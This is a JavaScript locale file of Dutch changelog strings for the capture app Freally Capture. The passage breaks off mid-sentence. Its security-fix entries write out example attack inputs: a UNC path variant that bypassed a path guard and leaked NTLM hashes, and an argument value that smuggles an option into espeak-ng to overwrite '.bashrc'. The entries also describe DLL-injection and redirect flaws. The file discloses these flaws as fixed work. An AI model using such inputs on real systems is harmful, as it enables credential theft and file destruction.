(function (all) { var mine = all["nl"] = all["nl"] || {}; var add = {"changelog.55f272992501":"Alle noemenswaardige wijzigingen in Freally Capture worden in dit bestand vastgelegd.","changelog.34cd2e6013c5":"De opmaak is gebaseerd op <a href=\"https://keepachangelog.com/en/1.1.0/\">Keep a Changelog</a>, en dit project streeft ernaar <a href=\"https://semver.org/spec/v2.0.0.html\">Semantisch Versioneren</a> te volgen.","changelog.b6512e169100":"<strong>Status: stabiel.</strong> <strong>1.0.0</strong> voltooide de getelde roadmap van 100 functies (alle 26 must-haves van CAP-M + alle 74 nice-to-haves van CAP-N) plus de vijf functies voor de afwerking van de lancering. <strong>1.1.0</strong> voegde de automatische export toe die al sinds Build 12 openstond, en <strong>1.2.0</strong> voegt de laatste drie toe: de virtuele camera, een echte browserbron en game-opname. <strong>1.2.1</strong> is de Operation_Optimization-audit: geen nieuwe functies, maar een ronde op beveiliging en juistheid door de hele codebase — en de drie toevoegingen van 1.2.0 zijn nu echt bereikbaar en werken. De ladder hieronder laat zien hoe het zover kwam, vanaf de studio-MVP van 0.70.0.","changelog.bd0bded7ecb3":"[1.2.1] — 2026-08-20 (Operation_Optimization — audit, hardening &amp; bereikbaarheid)","changelog.52c9ccef246a":"<strong>Een audit van de volledige codebase, en de reparaties die eruit voortkwamen.</strong> Elk onderdeel van de app — alle ~147k regels verdeeld over 13 onderdelen — ging door <code>/simplify</code>, <code>/security-review</code> en <code>/code-review</code>. Er is niets nieuws toegevoegd. Wat wel veranderde, is dat verschillende dingen die in 1.2.0 al <em>uitgebracht</em> waren nu echt <strong>werken</strong>: game-opname bereikte geen enkele moderne titel, de virtuele camera kon helemaal niet worden gestart en de browserbron was verborgen in het menu. Daarnaast was een padbeveiliging waar elke andere beveiliging in de app op steunt met één teken te omzeilen.","changelog.b16452720739":"Opgelost — beveiliging","changelog.d62edfd54f4e":"<strong>De beveiliging voor netwerkpaden miste twee UNC-schrijfwijzen die Windows accepteert.</strong> <code>is_remote</code> testte op <code>\\\\</code> en <code>//</code>, maar niet op <code>/\\</code> of <code>\\/</code>, en Win32 behandelt de scheidingstekens in dat voorvoegsel van twee tekens als uitwisselbaar — <code>GetFullPath(&quot;/\\localhost\\C$\\Windows&quot;)</code> wordt echt omgezet naar <code>\\\\localhost\\C$\\Windows</code>. Omdat dit ene predicaat achter <em>elke</em> padcontrole in de app zit (opnames, map tonen, pakketimport, de pipeline, automatisering en zes studiobeveiligingen), bereikte één vervangen teken een echte SMB-verbinding en lekte er een NTLM-wachtwoordhash naar een host die de aanvaller had gekozen. Nu worden beide scheidingstekens genormaliseerd en wordt witruimte aan het begin weggehaald.","changelog.57f43b5bfb70":"<strong>De injectie voor game-opname vertrouwde een mogelijk hergebruikte pid.</strong> <code>inject()</code> controleerde de toestemming tegen de naam van het uitvoerbare bestand die de <em>aanroeper</em> doorgaf, nooit tegen het proces dat het echt opende — en Windows hergebruikt pids agressief tussen het opzoeken van het venster en <code>OpenProcess</code>. Het vraagt nu de imagenaam op via de geopende handle en controleert de toestemming opnieuw vóór <code>CreateRemoteThread</code>.","changelog.14fb39bd677f":"<strong>WHIP accepteerde <code>http://</code>.</strong> Bij WHIP <em>is</em> de streamsleutel het bearer-token, dus een onversleuteld eindpunt zette de inloggegevens bij elke herverbinding leesbaar op de lijn. Alleen nog <code>https</code>.","changelog.e53e8143a9a0":"<strong>Bij <code>espeak-ng</code> ontbrak <code>--</code> vóór de tekst van de gebruiker</strong> (de <code>spd-say</code>-tak had het al), dus een autocueregel als <code>-w/home/user/.bashrc</code> liet het een WAV over dat bestand heen schrijven.","changelog.27867a99df1e":"<strong>De regel „alleen absolute paden” van NDI was een <code>debug_assert!</code></strong> — weggecompileerd uit de uitgebrachte build, waardoor een omgevingsvariabele die de gebruiker kan schrijven <code>LoadLibraryW</code> naar een relatief pad kon sturen.","changelog.e7e404533641":"<strong>Het uitnodigingstoken voor gasten op afstand is uit de querystring gehaald</strong> en naar het URL-fragment verplaatst, zodat het niet meer in de toegangslogs van Pages, de browsergeschiedenis of een cross-origin <code>Referer</code> terechtkomt.","changelog.db73bbe95da1":"<strong>De wachtwoordzin voor SRT-ontvangst wordt gemaskeerd</strong>, net als elk ander geheim veld in de app.","changelog.e6d73277285d":"Opgelost — crashes en juistheid","changelog.66b4f9443b67":"<strong>De compositor kon een panic veroorzaken op de renderthread.</strong> Hij wiste midden in een frame de volledige pipelinecache van gebruikersshaders terwijl <code>compose_scene</code> nog plannen vasthield die ernaar verwezen, en deed daarna <code>.expect()</code> — bereikbaar met twee shaderfilters en gewoon live bewerken, omdat elke toetsaanslag in de shader-editor een nieuwe hash aanmaakt. Opzoekingen mogen nu mislukken, en bij het opruimen worden alleen mislukte compilaties verwijderd.","changelog.b9e2ec0e1165":"<strong>Er was geen handler voor niet-afgevangen wgpu-fouten geïnstalleerd</strong>, dus elke validatie- of geheugentekortfout waar dan ook in de compositor bracht het hele proces tot een panic. Die worden nu gelogd, en het frame wordt overgeslagen.","changelog.b8bd5c6887ba":"<strong>Verborgen groepen verschenen in de uitzending tijdens bewegingsovergangen</strong> — elk ander compositiepad respecteert <code>group_hides</code>; het morph-pad niet, dus verborgen items werden gedurende de hele overgang opgenomen en gestreamd.","changelog.a87472f8edb5":"<strong>Streamen en replay weigeren nu een frame met de verkeerde grootte.</strong> Het canvas kan midden in een sessie veranderen en encoders krijgen ruwe frames van vaste grootte, dus één buffer met de verkeerde maat bracht de bytestroom voor de rest van de uitzending uit de pas, terwijl de status nog „live” aangaf.","changelog.42b801d420c3":"<strong>Een audio-underrun had geen herstel.</strong> Zodra de prebuffer van 30 ms leeg was, was elk volgend blok een gedeeltelijk blok aangevuld met stilte — aanhoudend gekraak in plaats van één enkele hapering.","changelog.b31061525f09":"Dubbele item-id's indexeren niet meer voorbij de cache van de filterketen; een fade-duur van NaN slaat het filter over in plaats van de bron voor altijd te verbergen; te grote maskerafbeeldingen worden geweigerd in plaats van wgpu een panic te laten veroorzaken; en <code>fader_gain</code> kreeg de <code>is_finite</code>-controle die zijn tegenhanger al had (een NaN blijft daar hangen en vergiftigt de mastermix, LUFS en de opname voorgoed).","changelog.c77e993871b2":"Opgelost — CAP-N78 game-opname werkt nu met moderne titels","changelog.9f9efaee9c7f":"<strong>Alleen <code>IDXGISwapChain::Present</code> werd gehookt.</strong> DXGI 1.2+-games met het <strong>flip-model</strong> — het meeste wat in exclusief volledig scherm draait — presenteren via <code>Present1</code> en komen nooit aan dat slot, dus de injectie meldde succes en er kwam geen enkel frame aan. Beide slots worden nu gehookt, gedekt door een end-to-end-test die een echte flip-model-swapchain bouwt, alleen via <code>Present1</code> presenteert en het opgenomen frame weer uitleest.","changelog.77d8a35def9c":"<strong>Een verloren apparaat (device-lost) wordt afgehandeld.</strong> De gedeelde textuur onthoudt het apparaat dat hem heeft gemaakt, dus een TDR of een alt-tab uit exclusief volledig scherm bouwt hem opnieuw op in plaats van tussen twee apparaten te kopiëren.","changelog.b122bc48cff9":"<strong>Meerdere swapchains bouwen de gedeelde textuur niet meer bij elke present opnieuw op</strong> (een launchervenster, een editorviewport of een opstartscherm dwong vroeger 60+ keer per seconde een herbouw op volledige resolutie af); de eerste chain wordt vastgehouden.","changelog.fda7f3673f30":"<strong>Backbuffers met multisampling worden eerst geresolved</strong> in plaats van <code>CopyResource</code> stilletjes te laten mislukken.","changelog.b3bac7144e62":"<strong>De vtable wordt bij het ontladen echt hersteld</strong> — expliciet vanuit <code>DLL_PROCESS_DETACH</code>, en alleen als de slots nog onze functies bevatten, zodat een overlay die daarna hookte nooit stilletjes wordt losgekoppeld. (De eerdere bewering dat de <code>Drop</code> van <code>HookState</code> dit deed, klopte niet: Rust dropt statics nooit.)","changelog.27986d7f86bc":"<strong>Een D3D12-titel faalt nu snel en eerlijk</strong> in plaats van de time-out voor het eerste frame op te souperen, en de geïnjecteerde DLL schrijft niet meer naar stderr — een game in het GUI-subsysteem heeft geen stderr-handle, en met <code>panic = &quot;abort&quot;</code> liet een mislukte schrijfactie de <em>game</em> afbreken.","changelog.dd55e1058c26":"De renderthread van de game betaalt niet meer bij elke present een wachttijd van 4 ms op een keyed mutex.","changelog.3f346cd6bbf4":"Opgelost — eindelijk bereikbaar","changelog.ef07cd87f669":"<strong>De browserbron staat in het menu Toevoegen.</strong> Hij werd in 1.2.0 compleet uitgebracht, maar achter een uitgeschakelde vlag, en het menu zei operators nog steeds dat ze in plaats daarvan Vensteropname moesten gebruiken.","changelog.3ff4af9be26b":"<strong>De virtuele camera kan worden gestart.</strong> De backend was klaar en niets riep hem aan: er waren geen start- en stopopdrachten en de knop was in de code vast uitgeschakeld. Hij is nu van begin tot eind aangesloten en takt af van de <em>bestaande</em> readback van het programma, zodat inschakelen één extra publicatie kost per frame dat toch al werd uitgelezen. Nog steeds niet ondertekend, en een echte test in Zoom/Meet/Teams staat nog open.","changelog.01041cd1674e":"Gewijzigd — prestaties","changelog.ae778ae72eb2":"Vier decodeerpaden kopieerden bij elk frame het hele frame; de compositor vernietigde elke textuur van de filterketen 60×/s en bouwde die opnieuw op (de cache werd per compositie opgeschoond, maar compositie draait voor programma, voorbeeld, verticaal, geneste scènes, miniaturen, projectoren en beide helften van een overgang); <code>.frec</code>-opname deed per frame een syscall en kopieerde 8 MB vóór het aftrekken; FLZ reserveerde per slice een tabel van 64 KiB en de decoder reserveerde een buffer die hij meteen weer wegkopieerde; <code>sanitize</code> was kwadratisch bij elke keer laden en importeren; de opnamemailbox gaf een frame van 8 MB vrij binnen het slot waarop zijn consument wacht.","changelog.8800583b308d":"<strong>Denormale getallen in de audio worden naar nul afgerond.</strong> Met <code>forbid(unsafe_code)</code> is de flush-to-zero-bit van MXCSR niet beschikbaar, dus gedempte kanalen zakten weg in het denormale bereik en bleven daar, wat 10–100× per sample kostte.","changelog.70947783a47e":"Toegevoegd — robuustheid en tooling","changelog.cc7a8bef1645":"<strong>Een React-error-boundary</strong>, aangesloten op de twee gedeelde schillen (<code>PickerShell</code>, geïmporteerd door 59 bestanden, en <code>Panel</code>). Een fout tijdens het renderen ontkoppelde vroeger de hele studio, terwijl de Rust-kant gewoon doorging met coderen en streamen — niet uit de lucht, maar blind en niet in staat om te stoppen. Een gecrasht dialoogvenster houdt nu zijn sluitknop.","changelog.c7dc2964a7e9":"<strong>Twee visuele smoketests slaagden op een leeg scherm.</strong> <code>11-recordings</code> en <code>19-profiles</code> waren allebei precies 4.255 bytes: de mock definieerde nooit de opdrachten die deze dialoogvensters lezen, de app werd ontkoppeld en de lus controleerde niets. De mock kreeg 16 opdrachten en een complete set testinstellingen, en de lus controleert nu dat het dialoogvenster echt zichtbaar is.","changelog.e020b3ffc504":"<strong>Fuzzing.</strong> Deterministische rondes met misvormde invoer voor de <code>.frec</code>-decompressor en de parser voor opname-id's draaien in de normale testsuite op alle drie de besturingssystemen, plus een <code>cargo-fuzz</code>-harnas — 77.625.230 uitvoeringen tegen <code>flz::decompress_into</code> zonder één crash.","changelog.f52e2bae0c8f":"<code>docs/local-security-tooling.md</code> legt vast welke uitsluitend lokale scanners zijn gedraaid (Semgrep: 0 bevindingen; Trivy: 0 geheimen, 0 hoog/kritiek) en, eerlijk, waarom Miri hier het toevoegen <em>niet</em> waard is: alle twaalf bibliotheekcrates hebben al <code>deny(unsafe_code)</code>, en de resterende unsafe code is FFI, die Miri niet kan uitvoeren.","changelog.30ae102eb166":"[1.2.0] — 2026-08-19 (Diepe opname &amp; web)","changelog.c240db164d51":"<strong>De laatste drie toevoegingen aan de app.</strong> De virtuele camera, een echte browserbron en game-opname via een geïnjecteerde present-hook op de GPU. Alle drie werken eerst op Windows, en het verhaal per besturingssysteem wordt eerlijk verteld in plaats van vervalst. Twee ervan leveren onderdelen mee die <strong>nog niet met code ondertekend</strong> zijn, en de livetests in de praktijk (de camera zichtbaar in een vergaderapp; injecteren in een beveiligde titel) staan nog open — beide worden in de notities hieronder benoemd in plaats van weggemoffeld.","changelog.6b02e0d363a4":"Toegevoegd","changelog.15c7060f73c9":"<strong>Game-opname via een geïnjecteerde present-hook op de GPU (CAP-N78, Windows).</strong> Een game kan nu worden opgenomen via de <code>Present</code> van zijn eigen swapchain — voor titels in exclusief volledig scherm die WGC-vensteropname niet kan bereiken, op de eigen presenteersnelheid van de game. Het is <strong>strikt per titel opt-in</strong>: er wordt niets geïnjecteerd totdat je het onomwonden beschreven risico rond anti-cheat/antivirus voor die specifieke game accepteert (een <code>Consent</code> die tot één uitvoerbaar bestand beperkt is en alleen uit een uitdrukkelijke bevestiging wordt aangemaakt — die kan nooit tegen een andere game worden hergebruikt), en een titel die de hook weigert, valt terug op de bestaande Vensteropname met een eerlijke melding, nooit met een crash. Bronnen ▸ Spelopname (lees eerst) → accepteren → de game kiezen. De hook-DLL past alleen de DXGI-vtable aan, kopieert elke backbuffer naar een gedeelde textuur met keyed mutex en herstelt de vtable bij het ontladen; een bezet frame wordt overgeslagen, zodat de game nooit op ons blijft wachten. HDR-backbuffers gaan naar WGC (waarvoor de desktopcompositor de tonemapping doet) in plaats van verkeerd als 8-bit te worden gelezen. Nieuwe crate <code>freally-game-hook</code>; protocol in <code>design/game-hook-protocol.md</code>.","changelog.8a03cfb2c221":"<strong>Virtuele camera (CAP-N76, Windows).</strong> Het samengestelde programma wordt aan een „Freally Capture Virtual Camera” gevoerd via een lock-free shared-memory-transport met dubbele buffer (<code>fcap_stream::vcam::transport</code>) en de levenscyclus van Media Foundation <code>MFCreateVirtualCamera</code> (<code>fcap-vcam-win</code>), die het apparaat bij stoppen <em>en</em> bij drop afbreekt, zodat er geen zombiecamera achterblijft. De geregistreerde frame-server-bron is een echte <code>IMFMediaSource</code>-COM-DLL (<code>freally-vcam-source</code>) die zichzelf per gebruiker registreert (geen beheerdersrechten nodig) en de frames van de app als RGB32-stroom levert — hetzelfde model van op aanvraag opgehaalde, met een hash gecontroleerde onderdelen als bij de bruggen voor ffmpeg/CEF. <code>virtual_camera_status</code> laat de UI eerlijk zien of de camera beschikbaar is; de camera draait zonder ondertekening voor de huidige gebruiker, en code-ondertekening is de enige stap die nog aan de release vastzit. macOS (CoreMediaIO) en Linux (v4l2loopback) zijn eigen onderdelen.","changelog.7f566bdedc82":"<strong>Echte browserbron — CEF-OSR-backend (CAP-N77).</strong> Een willekeurige http/https-pagina wordt offscreen via CEF weergegeven op de gekozen resolutie/fps en naar de compositor gestreamd als <code>FBH1</code> + frames van vaste grootte. De backend (<code>crates/browser-host --features cef</code>) linkt libcef uit het vastgepinde, met een hash gecontroleerde CEF-onderdeel en laat <strong>elke</strong> navigatie door de gedeelde toestemmingslijst gaan (een omleiding naar <code>file://</code>/<code>javascript:</code> wordt geannuleerd, nooit gevolgd). End-to-end gecontroleerd op Windows: een live-URL wordt naar echte frames weergegeven en sluit netjes af bij stdin-EOF. De runtime wordt pas bij het eerste gebruik opgehaald (nooit meegeleverd); code-ondertekening per besturingssysteem is de resterende releasestap.","changelog.8f6fb4eb7f42":"Beveiliging","changelog.2e30d476c4fe":"<strong>De browserbron draait op Windows nu met de renderer-sandbox van Chromium.</strong> De host geeft willekeurige webpagina's weer, en zo'n pagina kan uit een geïmporteerde scèneverzameling komen, dus voorheen startte hij Chromium met de sandbox uitgeschakeld — de enige maatregel die voorkomt dat een gecompromitteerde pagina code onder jouw naam kan uitvoeren. Windows draait nu in de sandbox. macOS en Linux blijven voorlopig zonder sandbox (de Linux-sandbox heeft een bevoorrechte helper nodig die het onderdeel nog niet meelevert), en dat staat in de code vermeld in plaats van dat het opzettelijk lijkt.","changelog.17f0a576df73":"<strong>Toestemming voor game-opname reist niet meer mee in een scèneverzameling.</strong> Een verzameling is een deelbaar document — een <code>.fcappack</code>, een OBS-import, een momentopname, een met de hand bewerkt bestand — dus die mag nooit de bevoegdheid kunnen meedragen om een DLL in een ander proces te injecteren. Voorheen kon dat wel: de vlag „ik accepteer het anti-cheatrisico” was een veld in het document, en een ontvangen pakket waarvan de bron voor game-opname een willekeurig uitvoerbaar bestand noemde, injecteerde daar bij het importeren in, zonder vraag en zonder dat de risicotekst ooit werd getoond. Bij het laden van een verzameling wordt die vlag nu altijd gewist (gedekt door een regressietest), zodat een geïmporteerde indeling terugvalt op gewone Vensteropname totdat de operator opnieuw toestemming geeft via de kiezer — de enige plek waar de waarschuwing echt wordt getoond.","changelog.5d0d9a1170f9":"<strong>Toestemming is nu gekoppeld aan het uitvoerbare bestand dat de gebruiker echt heeft goedgekeurd.</strong> Ze werd aangemaakt uit het uitvoerbare bestand dat bij het starten werd bepaald en daarna tegen diezelfde string gecontroleerd, dus de controle kon nooit mislukken en de gedocumenteerde garantie „toestemming voor <code>game-a.exe</code> kan nooit tegen <code>game-b.exe</code> worden hergebruikt” bestond tijdens het draaien niet. Toestemming wordt nu verleend voor het programma dat werd vastgelegd toen de bron werd gekozen, en gecontroleerd tegen het programma waar het venster nu naar verwijst, zodat een bron die aan een ander proces wordt gekoppeld, wordt geweigerd in plaats van geïnjecteerd.","changelog.4118fb4fed0e":"Verwijderd","changelog.a76a693b9e23":"<strong>Integratie met Freally Central („Meer Freally-apps”).</strong> Freally Central bestaat niet meer, dus de meegeleverde submodule <code>vendor/freally-central</code> en alles wat ervan afhing is weg: de crate-afhankelijkheid <code>freally-central-engine</code> en de zeven bijbehorende <code>central_*</code>-Tauri-opdrachten, het menu-item <strong>Help → Meer Freally-apps</strong> en het dialoogvenster ervan, de <code>fcp-*</code>-themabrug van het paneel, de tsconfig/vite-aliassen voor <code>@freally/central-panel</code>, en de meegeleverde <code>fcp-*</code>-localecatalogi die in elke bundel waren opgenomen. Capture hangt niet meer af van een repository die verdwenen is — een verse clone en een CI-checkout slagen nu, waar de ontbrekende submodule ze zou hebben laten mislukken.","changelog.1246fc93bca0":"Opgelost","changelog.3e3cbc39c891":"<strong>De browserhost wordt nu netjes afgesloten in plaats van botweg beëindigd.</strong> De host werd gestart met zijn stdin op <code>/dev/null</code>, waardoor het in het protocol gedocumenteerde signaal „stdin gesloten → exit 0” onmogelijk te versturen was — dus elke stop was een harde kill, waardoor de eigen render- en GPU-subprocessen van CEF als wees achterbleven. Zijn stdin is nu een actieve pipe, en het sluiten ervan geeft de host een begrensde respijtperiode (500 ms) om zelf af te sluiten voordat hij wordt beëindigd. Die grens is bewust: <code>stop()</code> wacht op de pomp, dus dit zit op het reconcile-pad van de studio en mag een scènewissel nooit laten vastlopen.","changelog.158d17057e90":"<strong>De ophaler van de CEF-runtime is vastgepind op de lijn waartegen de host is gebouwd.</strong> Voorheen nam hij wat <code>index.json</code> de nieuwste noemde. CEF heeft geen ABI-stabiliteit tussen hoofdversies en de host weigert een runtime waartegen hij niet is gebouwd, dus „nieuwste” kon een download van ~100 MB kosten om uit te komen bij een browserbron die doodloopt. Nu wint de nieuwste stabiele <code>minimal</code>-build <em>binnen</em> de vastgepinde hoofdversie, die nog steeds de beveiligingspatches van Chromium binnen die lijn meeneemt.","changelog.7416b5a9ae50":"<strong>De regel „alleen http/https” geldt nu ook voor omleidingen, niet alleen voor de eerste URL.</strong> Een pagina die via http werd geserveerd, kon omleiden — 302, <code>location.href</code>, <code>window.open</code>, een subframe — naar <code>file://</code> om lokale bestanden te lezen, of naar <code>javascript:</code>/<code>data:</code> om script uit te voeren dat de operator nooit had gekozen. De toestemmingslijst is één geteste poort (<code>is_allowed_url</code>) die de CEF-backend nu verplicht vanuit zijn navigatiehandler moet aanroepen, zodat de argv-regel en de omleidingsregel niet uit elkaar kunnen groeien.","changelog.d70c33477501":"<strong>De componentbanner van de browserkiezer volgt de installatie in plaats van te bevriezen bij het openen.</strong> Hij las de runtimestatus één keer bij het mounten, dus wie via Extra → Componenten installeerde terwijl de kiezer open was, zag nog steeds dat het onderdeel ontbrak. Hij abonneert zich nu op het <code>cef</code>-event en onderscheidt de vier toestanden: niet geïnstalleerd, een installatie die al bezig is, een installatie die mislukt is (met de reden), en een platform waarvoor CEF geen build publiceert — waar „installeer het via Componenten” een advies was dat nooit kon slagen.","changelog.de0da2df5676":"<strong>Het CEF-backendkoppelvlak van de browserhost wordt in CI gelint.</strong> <code>--features cef</code> wordt alleen door de componentmijlpaal gebouwd, dus het was afgedreven naar een toestand die <code>clippy -D warnings</code> niet doorstond en die build bij de eerste keer had laten breken. CI lint het koppelvlak nu bij elke push.","changelog.63e7bdb09d63":"<strong>Game-opname overleeft een formaatwijziging of alt-tab.</strong> De benoemde handle voor de gedeelde textuur van de producent werd aangemaakt en daarna achteloos weggegooid, dus de naam bleef geregistreerd zolang het gameproces leefde. Elke wijziging van de afmetingen probeerde de textuur daarna opnieuw aan te maken onder een naam die nog bestond, mislukte met <code>DXGI_ERROR_NAME_ALREADY_EXISTS</code>, en de opname stierf definitief zonder dat er iets werd gemeld. De handle wordt nu bewaard en gesloten, en de oude textuur wordt vrijgegeven voordat de vervanger wordt gebouwd.","changelog.0a3b42e6c8d3":"<strong>De eerste Spelopname die je toevoegt, valt niet meer stilletjes terug op Vensteropname.</strong> De injectie keert terug zodra de externe <code>LoadLibraryW</code> dat doet, maar <code>DllMain</code> <em>start</em> alleen de thread die de hook activeert — het controleblok bestaat pas als die thread een apparaat en een dummy-swapchain heeft gebouwd. De app koppelde meteen en verloor die race altijd. Hij wacht nu (begrensd) tot de hook echt actief is.","changelog.b97f30288a77":"<strong>Een gehookte game die afsluit, geeft de bron vrij.</strong> <code>FLAG_PRODUCER_ALIVE</code> wordt nooit gewist — een game die wordt beëindigd of crasht, voert <code>DLL_PROCESS_DETACH</code> nooit uit — dus het laatste controleblok bleef bestaan met de vlag aan en de pomp bleef eeuwig op het laatste frame draaien, zonder ooit te sluiten of automatisch herstel te starten. De app vraagt het besturingssysteem nu of de game nog draait.","changelog.8f6e3e5d64ef":"<strong>Een game die de hook traag laadt, loopt geen risico meer op een crash.</strong> Bij de time-out van de injectie werd de externe pagina vrijgegeven terwijl <code>LoadLibraryW</code> van de game die nog kon lezen. De pagina wordt nu pas vrijgegeven als die thread aantoonbaar is beëindigd.","changelog.76d466ce9bcf":"<strong>Een mislukte activering kan opnieuw worden geprobeerd.</strong> Als het mappen van het controleblok mislukte, bleef de vlag „geïnstalleerd” staan, dus het proces bleef permanent half geactiveerd: geïnjecteerd, nooit publicerend en niet in staat te herstellen. De hookstatus wordt nu ook gepubliceerd <em>voordat</em> het vtable-slot wordt aangepast — een present die daartussen viel, vond geen status en gaf <code>S_OK</code> terug zonder door te schakelen naar de echte <code>Present</code>, waardoor de flip van dat frame stilletjes werd ingeslikt.","changelog.1fdb03f5eeaf":"<strong>De bron-DLL van de virtuele camera kan niet meer worden ontladen terwijl hij in gebruik is.</strong> <code>DllCanUnloadNow</code> antwoordde onvoorwaardelijk <code>S_OK</code> — die export <em>is</em> de manier waarop COM het vraagt — dus een <code>CoFreeUnusedLibraries</code> in de host van de frameserver kon hem ontladen terwijl een vergaderapp de mediabron nog vasthield. Hij meldt nu een echte telling van objecten en serverlocks. <code>Shutdown</code> doorbreekt ook de sterke referentiecyclus tussen bron en stroom, die bij elke keer dat de camera werd geopend geheugen lekte.","changelog.686194fae62e":"<strong>Twee strings die de gebruiker ziet, bevatten reeksen losse spaties</strong> die er door een regelafbreking in waren geslopen (de foutmelding over de vastgepinde CEF bij Componenten en de tooltip van de virtuele camera buiten Windows).","changelog.faf05b9b72f7":"[1.1.0] — 2026-07-20 (Diepe opname &amp; web — fase 10, eerste deel)","changelog.4eb7f2b2ea1d":"<strong>De diepgang na 1.0 begint.</strong> Fase 10 opent de drie opnameonderdelen die al lang een „eigen mijlpaal” waren — een virtuele camera, een echte browserbron en game-opname — als een netjes ingeplande build. Deze versie levert het stuk dat af is en op zichzelf staat: <strong>automatisch een deelbare kopie exporteren bij het stoppen (CAP-N75)</strong>, de roadmapfunctie die al sinds Build 12 openstond. De runtimes voor de browserbron en de virtuele camera zijn submijlpalen met ondertekening en componenten die in latere versies komen; voor de gebruiker is daarvan nog niets zichtbaar. Alles wat nieuw is, staat standaard uit, blijft lokaal en voegt geen netwerkverbinding toe.","changelog.f4bd0df9d9a9":"<strong>Automatisch een deelbare MP4 exporteren bij het stoppen (CAP-N75)</strong> — één schakelaar in <strong>Instellingen → Uitvoer</strong>, <em>„Ook een deelbare MP4 naast de master opslaan”</em> (alleen zichtbaar bij opnemen naar het eigen <code>.frec</code>, <strong>standaard uit</strong>). Als een <code>.frec</code>-opname wordt afgerond, schrijft een export op de achtergrond er een MP4-kopie naast die met een dubbelklik afspeelt — zichtbaar in de wachtrij na opname van het dialoogvenster Opnamen — via hetzelfde coderingspad als de handmatige export, met namen die nooit botsen. De verliesvrije <code>.frec</code>-master wordt nooit aangeraakt, en de kopie staat in de wachtrij vóór elke pipeline na opname, zodat een verplaatsstap de master er niet onder vandaan kan halen. Houd de master die een crash overleeft <strong>en</strong> krijg er gratis een deelbaar bestand bij.","changelog.8a7525b1492f":"Opmerkingen","changelog.684a3421d35f":"Voorbereidend werk gedaan (nog niet zichtbaar in deze versie): de <strong>echte browserbron</strong> (CAP-N77) aan de kant van de app met zijn CEF-architectuur in een hulpproces, en het transportkoppelvlak van de <strong>virtuele camera</strong> — beide wachten op ondertekende runtimes als component, die als eigen submijlpalen verschijnen. Zie fase 10 van de roadmap.","changelog.1255703a672a":"[1.0.0] — 2026-07-19 (Stabiel — overlays voor streamproductie &amp; afwerking voor de lancering)","changelog.c682627010fd":"<strong>De stabiele 1.0.0.</strong> De getelde drempel van 100 functies (26 must-haves van CAP-M + 74 nice-to-haves van CAP-N) werd gehaald bij 0.900.0; deze versie levert de vijf functies voor de afwerking van de lancering die voor 1.0.0 waren geparkeerd — het aftelscherm vóór de show, een sociale balk, een uitgelichte chatbanner, scherptediepte achter dialoogvensters en opgeruimde scènegeschiedenis — plus een ronde reparaties aan speler en audio. Alles wat nieuw is, staat standaard uit of is niet gekoppeld, blijft lokaal en voegt geen netwerkverbinding toe.","changelog.13b71822377f":"<strong>Aftelscherm „Begint zo” (V1-C)</strong> — één klik vanuit Bron toevoegen: een aftelling over het hele canvas (bijschrift boven een grote klok) die aftelt NAAR een kloktijd die je kiest met een 12-uursklokkiezer (uren 1–12, minuten in stappen van 5 minuten, AM/PM). Bij nul <strong>knippert het en blijft het staan</strong> — de gastheer haalt het weg en schakelt met de hand naar live, nooit automatisch. Achtergronden: een verloop van twee kleuren, een effen kleur, een stilstaande afbeelding (ingesloten, passend gemaakt, gecentreerd, nooit bijgesneden), of een <strong>GIF/video</strong> die op de herhalende achtergrond van de scène meeloopt — met optionele <strong>achtergrondmuziek</strong> (mp3/wav/flac/m4a/aac/ogg/opus) die je in hetzelfde dialoogvenster kiest. De aftelling wordt in het programma gecomponeerd, dus kijkers van de stream of de opname zien hem.","changelog.110b8b024a21":"<strong>Achtergrondmuziekbron</strong> — Bron toevoegen → Achtergrondmuziek…: een of meer audiobestanden als onzichtbare, herhalende afspeellijst (optioneel willekeurig), automatisch gemonitord zodat je het in het voorbeeld hoort en het in de opname/stream terechtkomt; als je het toevoegt, wordt het eigen geluid van een video-achtergrond gedempt, zodat er <strong>altijd maar één achtergrondgeluid speelt</strong>.","changelog.6c522580be6b":"<strong>Bron met sociale balk &amp; kanalen (V1-D)</strong> — een gegenereerde overlay met je accountnamen: meegeleverde platformregels (YouTube, Twitch, Kick, X, Instagram, TikTok, Facebook, Discord) als badges in merkkleuren, plus eigen regels en een optionele kop; elke regel en naam is te bewerken in Eigenschappen.","changelog.9d0f60a20a05":"<strong>Banner met uitgelicht chatbericht (V1-E)</strong> — kies een recente chatregel (uit elke actieve chat-overlay) en zet die als opgemaakte banner onderaan in het programma; de kleuren worden in de instellingen bewaard, het vastzetten zelf is bewust tijdelijk. Met één klik weg te halen.","changelog.18f4b83dbd99":"<strong>Scherptediepte achter dialoogvensters (V1-A)</strong> — elk modaal venster vervaagt en dimt de studio erachter (houdt rekening met het thema en respecteert verminderde beweging/transparantie); begeleidende vensters zoals de autocue blijven scherp, zodat de operator kan blijven lezen.","changelog.501b690add0e":"<strong>Opgeruimde scènegeschiedenis (V1-B)</strong> — een lijst Recente scènes met <strong>Geschiedenis wissen…</strong> in één klik (met bevestiging), plus Scèneverzameling → Geschiedenis wissen… om overbodige verzamelingen in één keer te verwijderen (de actieve wordt nooit aangeraakt).","changelog.c993200abe94":"<strong>Klassieke kleuren voor de audiovisualizer</strong> — een selectievakje in Eigenschappen zet de balken/VU om naar de klassieke groen→geel→rood-schaal uit de omroepwereld (de scoop wordt fosforgroen); uit = de ene effen kleur.","changelog.2581bdff5166":"<strong>Een repetitie opnemen</strong> — als je een repetitie start, wordt nu aangeboden die ook op te nemen in een normaal videobestand (alleen als er nog niets wordt opgenomen; de opname stopt samen met de repetitie), zodat een proefrun een master om te bewerken en te uploaden kan worden zonder ooit live te gaan.","changelog.3d3a4c1d8909":"<strong>Media-playlist had geen mixerkanaal</strong> — in de lijst met audiosoorten van de UI ontbrak <code>playlist</code> (en <code>replayPlayback</code>), dus afspeellijsten konden niet worden gefaded, gedempt of gemonitord; beide krijgen nu een kanaal.","changelog.5a87688dfb99":"<strong>Weergave van een afspeellijst met alleen audio</strong> — toont nu de <strong>naam van het huidige nummer</strong> (nette tekst, geen kapot tekenvakje); afspeellijsten voor achtergrondmuziek tekenen helemaal niets. Videoafspeellijsten zijn ongewijzigd.","changelog.7f672b15fac6":"<strong>Passing van aftelling en achtergrond</strong> — achtergronden met afbeeldingen, GIF's of video's krijgen een letterbox (contain) en worden gecentreerd in plaats van bijgesneden om te vullen, zodat het hele beeld altijd zichtbaar is.","changelog.fb60af02a1ed":"<strong>Reviewronde (vóór de release)</strong> — de beveiligingsronde vond één HIGH: het afbeeldingspad van het aftelscherm werd in de renderlus gelezen zonder de beveiliging voor netwerkpaden die elk 